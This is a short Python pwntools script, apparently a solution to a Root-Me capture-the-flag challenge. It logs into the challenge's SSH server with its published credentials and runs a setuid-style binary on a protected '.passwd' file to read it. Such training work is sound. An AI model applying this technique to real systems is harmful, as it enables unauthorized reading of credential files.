from pwn import*

s = ssh(host='challenge02.root-me.org' ,user='app-systeme-ch10' ,password='app-systeme-ch10',port=2222)

p = s.process(["./ch10", b".passwd"])

p.interactive()
